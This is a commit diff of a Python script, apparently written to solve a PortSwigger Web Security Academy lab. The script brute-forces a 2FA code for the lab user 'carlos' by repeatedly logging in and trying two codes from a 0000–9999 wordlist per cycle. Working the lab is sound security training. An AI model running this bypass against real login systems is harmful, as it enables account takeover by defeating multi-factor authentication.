725bdb060f49fee6c0b547e943456c7d1e351048
Pedro Henrique Santana <bmvaldete@gmail.com>
2026-09-22 10:21:08 -0300

    1/2 clean code and add project components

--- src/main.py
+++ src/main.py
@@ -3,7 +3,10 @@ import re
 import os
 import time
 import logging
+import argparse
 
+
+##CONFIGURATION INITIAL SETUP
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s | %(message)s",
@@ -15,6 +18,27 @@ logging.basicConfig(
 
 log = logging.getLogger(__name__)
 
+
+##CONSTANTS
+CODES_PATH = os.path.join(os.path.dirname(__file__), "..", "docs", "codes.txt")
+USERNAME = "carlos"
+PASSWORD = "montoya"
+
+
+##FUNCTION RESPONSIBLE FOR PARSING PROGRAM'S ARGUMENTS
+def parse_args():
+    parser = argparse.ArgumentParser(
+         description="2FA brute-force bypass via re-authentication cycling"
+    )
+    parser.add_argument(
+         "--target",
+         required=True,
+         help="Base URL of the lab, e.g. https://xxxx.web-security-academy.net"
+    )
+    return parser.parse_args()
+
+
+##FUNCTION RESPONSIBLE FOR EXTRACTING CSRF VALUE FROM A HTML CODE
 def extract_csrf(html_resp):
     match = re.search(r'name="csrf" value="([^"]+)"', html_resp)
     if match is None:
@@ -22,28 +46,25 @@ def extract_csrf(html_resp):
     csrf_token = match.group(1)
     return csrf_token
 
+
+##FUNCTION RESPONSIBLE FOR LOADING CODES WORDLIST (RANGE: 0000 - 9999)
 def load_codes(file_path):
     with open(file_path, "r") as f:
             codes = [line.strip() for line in f]
     return codes
 
-CODES_PATH = os.path.join(os.path.dirname(__file__), "..", "docs", "codes.txt")
 
+##FUNCTION RESPONSIBLE FOR EXECUTING A COMPLETE LOGIN CYCLE: LOGIN -> TWO 2FA TRIES -> RETURN (success: bool, new_csrf: str, new_index: int)
 def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
-    """
-    Execute a complete login cycle: login -> 2 2fa tries -> return (success: bool, new_csrf: str, new_index: int)
-    """
     lab_link = base_url + "/login"
-    ##start = time.perf_counter()
+    
     response = s.post(lab_link, 
                             data={
                               "csrf": updated_csrf_token,
-                              "username": "carlos",
-                              "password": "montoya"
+                              "username": USERNAME,
+                              "password": PASSWORD
                               },
                             timeout=15)
-    ##duration = time.perf_counter() - start
-    ##print(f"[POST /login] {duration:.2f}s |")
     
     csrf_login2 = extract_csrf(response.text)
     auth_endpoint = lab_link + "2"
@@ -51,7 +72,7 @@ def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
     code1 = codes[index % len(codes)]
     code2 = codes[(index + 1) % len(codes)]
 
-    ##start = time.perf_counter()
+    
     r1 = s.post(auth_endpoint,
                 data={
                     "csrf": csrf_login2,
@@ -60,17 +81,18 @@ def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
                 allow_redirects=False,
                 timeout=15
     )
-    ##duration = time.perf_counter() - start
-    ##print(f"[POST /login2 r1] {duration:.2f}s |")
+
     log.info("Testing code {}...".format(code1))
+
     if r1.status_code == 302:
             log.info("Success! Code: {}".format(code1))
             final = s.get(base_url + "/my-account", timeout=15)
             confirmed = "log out" in final.text.lower()
             log.info(f"[/my-account] status: {final.status_code} | confirmed: {confirmed}")
             return True, s.cookies.get("session"), None, None
+    
     log.info("Code failed!")
-    ##start = time.perf_counter()
+    
     r2 = s.post(auth_endpoint,
                 data={
                     "csrf": csrf_login2,
@@ -79,9 +101,9 @@ def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
                 allow_redirects=False,
                 timeout=15
     )
+
     log.info("Testing code {}...".format(code2))
-    ##duration = time.perf_counter() - start
-    ##print(f"[POST /login2 r2] {duration:.2f}s |")
+    
     if r2.status_code == 302:
         log.info("Success! Code: {}".format(code2))
         final = s.get(base_url + "/my-account", timeout=15)
@@ -96,15 +118,17 @@ def execute_login_cycle(s, base_url, updated_csrf_token, index, codes):
     
 
 def main():
-    base_url = "https://0a8d00ee045fd9f4805fdf0300a00011.web-security-academy.net"
+    args = parse_args()
+    base_url = args.target
     login_endpoint = "/login"
+    cycle_num = 0
+    index = 0
+
     codes = load_codes(CODES_PATH)
     s = requests.Session()
 
     response = s.get(base_url + login_endpoint, timeout=15)
     csrf_token = extract_csrf(response.text)
-    cycle_num = 0
-    index = 0
 
     while (True):
         try:
